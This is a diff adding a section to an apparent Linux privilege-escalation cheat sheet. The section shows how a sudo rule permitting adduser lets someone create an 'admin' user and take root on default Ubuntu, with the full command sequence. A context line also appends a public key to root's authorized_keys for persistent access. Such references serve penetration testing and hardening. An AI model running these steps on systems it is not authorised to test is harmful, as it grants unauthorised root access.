@@ -1302,6 +1302,54 @@ echo "YOUR_PUBLIC_KEY" >> /root/.ssh/authorized_keys
 
 ---
 
+### Sudo adduser Privilege Escalation (Ubuntu Admin Group)
+
+On Ubuntu systems with default sudoers configuration, the `admin` group has full sudo privileges. If you can create a new user, create one named `admin` to exploit this.
+
+**Vulnerable sudo rule:**
+```
+(ALL : ALL) NOPASSWD: /usr/sbin/adduser ^[a-zA-Z0-9]+$
+```
+
+**Exploitation:**
+
+By default, `adduser` creates a group with the same name as the user. Creating a user named "admin" puts them in a new group called "admin" which has sudo privileges on default Ubuntu installations.
+
+```bash
+# Create user named admin
+sudo /usr/sbin/adduser admin
+# Set password when prompted
+
+# Switch to admin user
+su - admin
+Password: [your password]
+
+# Check sudo privileges
+sudo -l
+# User admin may run the following commands on host:
+#     (ALL) ALL
+
+# Get root
+sudo su
+root@host#
+```
+
+**Why this works:**
+
+Ubuntu's default `/etc/sudoers` contains:
+```
+%admin ALL=(ALL) ALL
+```
+
+When you create a user named `admin`, a group named `admin` is also created and the user is added to it. This group matches the default sudoers rule, granting full sudo privileges.
+
+**Note:** This only works if:
+1. The default sudoers file hasn't been modified
+2. No `admin` user/group already exists
+3. You can create users via sudo
+
+---
+
 ### doas Privilege Escalation
 
 `doas` is a BSD alternative to sudo. Check for SUID and config.
